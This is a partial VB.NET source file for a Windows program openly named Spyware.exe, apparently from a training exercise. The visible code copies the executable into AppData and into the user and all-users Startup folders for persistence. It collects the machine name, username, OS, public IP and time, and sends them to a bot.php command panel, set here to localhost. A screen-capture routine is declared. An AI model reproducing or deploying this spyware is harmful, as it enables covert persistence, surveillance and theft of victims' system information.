Imports System.Drawing, System.Drawing.Drawing2D, System.Windows.Forms.Screen, System.Drawing.Graphics, System.Net, System.Text, System.Management
Public Class Form1
    ...
    Private toinstall As Boolean = False
    ...
    Private Function CapturarTela() As Bitmap
        ...
        End Try
    End Function
    Private Function instalador()
        If Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Spyware.exe" Then
            If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Spyware.exe") Then
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Spyware.exe")
                End
            Else
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Spyware.exe", True)
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Spyware.exe")
                End
            End If
        End If
        If Not IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Spyware.exe") Then
            My.Computer.FileSystem.CopyFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Spyware.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Spyware.exe", True)
        End If
        If Not IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) & "\Spyware.exe") Then
            My.Computer.FileSystem.CopyFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Spyware.exe", Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) & "\Spyware.exe", True)
        End If
        Return "Ok"
    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim Meuip As String
        Dim Mininav As New WebClient
        Meuip = New UTF8Encoding().GetString(Mininav.DownloadData("http://api.ipify.org/?format=text"))
        Dim infos As String = " - " & Environment.MachineName & " - " & Environment.UserName & " - " & My.Computer.Info.OSFullName & " - " & Meuip & " - " & TimeOfDay & " - " & Date.Today.ToString
        navigator.Navigate("http://localhost/treinamento/bot.php?client=" & infos)

        'MsgBox("Computador: " & Environment.MachineName & vbNewLine & "Usuário: " & Environment.UserName & vbNewLine & "Os: " & My.Computer.Info.OSFullName & vbNewLine & "Ip: " & Meuip & vbNewLine)
